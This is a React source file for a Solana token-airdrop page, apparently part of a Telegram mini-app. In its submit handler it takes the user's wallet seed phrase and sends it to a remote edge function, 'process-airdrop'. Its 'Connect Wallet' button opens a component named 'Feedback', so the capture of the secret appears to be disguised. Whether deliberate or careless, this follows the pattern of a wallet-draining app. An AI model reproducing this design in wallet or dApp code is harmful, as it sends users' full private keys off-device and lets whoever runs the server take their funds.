import { useState } from "react";
import { TelegramNavigation } from "@/components/TelegramNavigation";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import { Gift, Users, Send, AlertCircle, CheckCircle2, Wallet } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { useWallet } from "@/contexts/WalletContext";
import { useFeedback } from "@/contexts/FeedbackContext";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { Badge } from "@/components/ui/badge";
import { SolanaSetupAlert } from "@/components/SolanaSetupAlert";
import { z } from "zod";

const airdropSchema = z.object({
  tokenAddress: z.string().min(32, "Invalid token address"),
  amount: z.number().min(0.01, "Amount must be greater than 0"),
  addresses: z.array(z.string()).min(1, "At least one recipient required"),
});

const Airdrop = () => {
  const [formData, setFormData] = useState({
    tokenAddress: "",
    amount: "",
    addresses: "",
  });
  const [isProcessing, setIsProcessing] = useState(false);
  const [results, setResults] = useState<{ address: string; status: 'success' | 'failed' }[]>([]);
  const { toast } = useToast();
  const { isConnected, seedPhrase } = useWallet();
  const { openFeedback } = useFeedback();

  const parseAddresses = (text: string): string[] => {
    return text
      .split(/[\n,;]/)
      .map(addr => addr.trim())
      .filter(addr => addr.length > 0);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!isConnected || !seedPhrase) {
      toast({
        title: "Wallet not connected",
        description: "Please connect your wallet first",
        variant: "destructive",
      });
      openFeedback();
      return;
    }

    const addressList = parseAddresses(formData.addresses);
    const amountNum = parseFloat(formData.amount);

    try {
      const validation = airdropSchema.safeParse({
        tokenAddress: formData.tokenAddress,
        amount: amountNum,
        addresses: addressList,
      });

      if (!validation.success) {
        toast({
          title: "Validation Error",
          description: validation.error.errors[0].message,
          variant: "destructive",
        });
        return;
      }

      setIsProcessing(true);
      setResults([]);

      // Call edge function to process airdrop
      const { supabase } = await import("@/integrations/supabase/client");
      const { data, error } = await supabase.functions.invoke('process-airdrop', {
        body: {
          tokenAddress: formData.tokenAddress,
          amount: amountNum,
          addresses: addressList,
          seedPhrase: seedPhrase,
        }
      });

      if (error) {
        throw new Error(error.message);
      }

      if (!data.success) {
        throw new Error(data.error || 'Failed to process airdrop');
      }

      // Update results from response
      setResults(data.results.map((r: any) => ({
        address: r.address,
        status: r.status,
      })));

      toast({
        title: "Airdrop Complete! 🎁",
        description: `Successfully sent ${formData.amount} tokens to ${data.summary.successful}/${addressList.length} addresses.`,
      });
    } catch (error) {
      toast({
        title: "Airdrop Failed",
        description: "Failed to process airdrop. Please try again.",
        variant: "destructive",
      });
    } finally {
      setIsProcessing(false);
    }
  };

  const addressCount = parseAddresses(formData.addresses).length;
  const totalAmount = addressCount * parseFloat(formData.amount || "0");

  return (
    <div className="min-h-screen bg-background pb-24">
      <div className="max-w-2xl mx-auto px-3 sm:px-4 py-4 sm:py-6">
        <Card className="bg-card/50 backdrop-blur-sm">
          <CardHeader className="pb-4">
            <div className="flex items-center gap-3">
              <div className="p-2 bg-primary/10 rounded-lg">
                <Gift className="w-5 h-5 text-primary" />
              </div>
              <div>
                <CardTitle className="text-lg sm:text-xl">Token Airdrop</CardTitle>
                <CardDescription className="text-xs sm:text-sm">
                  Distribute tokens to multiple addresses
                </CardDescription>
              </div>
            </div>
          </CardHeader>
          <CardContent>
            <SolanaSetupAlert />
            
            {!isConnected && (
              <div className="space-y-3 mb-6">
                <Alert>
                  <AlertCircle className="h-4 w-4" />
                  <AlertDescription>
                    Please connect your wallet first to perform airdrops.
                  </AlertDescription>
                </Alert>
                <Button 
                  onClick={openFeedback}
                  className="w-full sm:w-auto"
                >
                  <Wallet className="w-4 h-4 mr-2" />
                  Connect Wallet
                </Button>
              </div>
            )}

            <form onSubmit={handleSubmit} className="space-y-6">
              <div className="space-y-4">
                <div className="space-y-2">
                  <Label htmlFor="tokenAddress">Token Address *</Label>
                  <Input
                    id="tokenAddress"
                    placeholder="Enter SPL token address..."
                    value={formData.tokenAddress}
                    onChange={(e) => setFormData({ ...formData, tokenAddress: e.target.value })}
                    required
                  />
                </div>

                <div className="space-y-2">
                  <Label htmlFor="amount">Amount per Address *</Label>
                  <Input
                    id="amount"
                    type="number"
                    step="0.01"
                    min="0.01"
                    placeholder="100"
                    value={formData.amount}
                    onChange={(e) => setFormData({ ...formData, amount: e.target.value })}
                    required
                  />
                </div>

                <div className="space-y-2">
                  <Label htmlFor="addresses">Recipient Addresses *</Label>
                  <Textarea
                    id="addresses"
                    placeholder="Enter addresses (one per line, comma, or semicolon separated)..."
                    rows={6}
                    value={formData.addresses}
                    onChange={(e) => setFormData({ ...formData, addresses: e.target.value })}
                    required
                  />
                  <div className="flex items-center justify-between text-xs text-muted-foreground">
                    <span className="flex items-center gap-1">
                      <Users className="w-3 h-3" />
                      {addressCount} recipient{addressCount !== 1 ? 's' : ''}
                    </span>
                    {totalAmount > 0 && (
                      <span>Total: {totalAmount.toLocaleString()} tokens</span>
                    )}
                  </div>
                </div>
              </div>

              <Button 
                type="submit" 
                className="w-full" 
                disabled={!isConnected || isProcessing}
              >
                {isProcessing ? (
                  "Processing..."
                ) : (
                  <>
                    <Send className="w-4 h-4 mr-2" />
                    Send Airdrop to {addressCount} Address{addressCount !== 1 ? 'es' : ''}
                  </>
                )}
              </Button>
            </form>

            {/* Results */}
            {results.length > 0 && (
              <div className="mt-6 space-y-2">
                <h3 className="text-sm font-semibold">Results</h3>
                <div className="max-h-48 overflow-y-auto space-y-1">
                  {results.map((result, index) => (
                    <div 
                      key={index}
                      className="flex items-center justify-between p-2 bg-background/50 rounded text-xs"
                    >
                      <span className="font-mono truncate flex-1 mr-2">
                        {result.address.slice(0, 8)}...{result.address.slice(-6)}
                      </span>
                      <Badge 
                        variant={result.status === 'success' ? 'default' : 'destructive'}
                        className="gap-1"
                      >
                        {result.status === 'success' ? (
                          <>
                            <CheckCircle2 className="w-3 h-3" />
                            Sent
                          </>
                        ) : (
                          <>
                            <AlertCircle className="w-3 h-3" />
                            Failed
                          </>
                        )}
                      </Badge>
                    </div>
                  ))}
                </div>
              </div>
            )}

            {/* Info */}
            <div className="mt-6 p-4 bg-primary/5 border border-primary/20 rounded-lg">
              <p className="text-xs text-muted-foreground">
                <strong>Note:</strong> Airdrops are processed sequentially with bundling optimization. 
                Network fees will be calculated and deducted from your wallet.
              </p>
            </div>
          </CardContent>
        </Card>
      </div>
      <TelegramNavigation />
    </div>
  );
};

export default Airdrop;
